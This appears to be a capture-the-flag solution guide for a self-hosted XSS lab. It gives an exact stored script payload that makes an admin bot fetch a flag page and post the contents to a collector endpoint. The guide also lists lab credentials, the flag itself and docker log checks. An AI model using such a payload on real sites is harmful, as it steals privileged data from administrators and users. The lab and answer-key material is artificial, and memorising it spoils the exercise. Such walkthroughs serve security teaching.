# Correct Payload for Tokyo's Account

## The Exact Payload You Need

When logged in as **Tokyo**, use this EXACT payload (copy-paste it):

```html
<script>
fetch('/admin/flag')
  .then(r => r.text())
  .then(flag => {
    fetch('/collector', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ user_id: 1, data: flag })
    });
  });
</script>
```

## Step-by-Step Instructions

1. **Login as Tokyo:**
   - Username: `tokyo`
   - Password: `rio123`

2. **Go to "Send Message"** (`/tickets/new`)

3. **Paste the payload above** in the **Message** field (NOT the Subject field)

4. **Click "Send Message"**

5. **Wait 20-30 seconds** (the bot runs every 8 seconds)

6. **Go to "Intercepted Data"** (`/my-captures`)

7. **You should see the flag:** `FLAG{THE_BOT_DID_THE_DIRTY_WORK}`

## Why `user_id: 1`?

- Tokyo is the first user created in the database
- User IDs start at 1
- The `/my-captures` page shows captures for the logged-in user (`req.user.id`)
- So when Tokyo logs in, `req.user.id = 1`
- Therefore, the payload must use `user_id: 1` to link the flag to Tokyo's account

## How It Works

1. **You (Tokyo)** submit the payload in a message
2. **The Professor-bot** visits `/admin/tickets` to review messages
3. **Your JavaScript executes** in the bot's browser (with admin privileges)
4. **The script fetches** `/admin/flag` → Gets `FLAG{THE_BOT_DID_THE_DIRTY_WORK}`
5. **The script sends** the flag to `/collector` with `user_id: 1`
6. **The collector stores** it in the database linked to `user_id: 1`
7. **You (Tokyo)** visit `/my-captures` → See the flag because `req.user.id = 1`

## Verification

After submitting, check the logs to verify:

```bash
# Check if flag was fetched
sudo docker-compose logs admin-bot --tail 50 | grep "Flag endpoint"

# Check if collector received the flag
sudo docker-compose logs web --tail 50 | grep "Flag detected"

# Check what data was stored
sudo docker-compose exec db psql -U ctf -d ctfdb -c "SELECT user_id, data FROM captures ORDER BY id DESC LIMIT 3;"
```

You should see:
- `[professor-bot] ✓ Flag endpoint accessed: 200` - Flag was fetched ✓
- `[collector] ✓ Flag detected for user_id=1` - Flag was received ✓
- Database shows `user_id=1` with the flag data ✓

## Troubleshooting

### If flag doesn't appear in `/my-captures`:

1. **Check your user_id:**
   - Try the test payload from `TEST_PAYLOAD.md` first
   - Verify your actual user_id (might not be 1 if you created other accounts)

2. **Check the logs:**
   - Look for `[collector] Captured data for user_id=X`
   - Make sure `X` matches your actual user_id

3. **Verify you're logged in as Tokyo:**
   - Check the top of the page - should say "Connected as **tokyo**"
   - If you see a different username, logout and login again as Tokyo

4. **Check if flag was already captured:**
   - The system prevents duplicates
   - If you see `[collector] Flag already captured`, the flag is already in your account
   - Refresh `/my-captures` page

## Important Notes

- **Don't change `user_id: 1`** - This links the flag to Tokyo's account
- **Don't add extra text** - The payload must be exactly as shown
- **Wait long enough** - The bot needs time to execute (20-30 seconds)
- **Check `/my-captures`** - Not `/admin/captures` or any other page

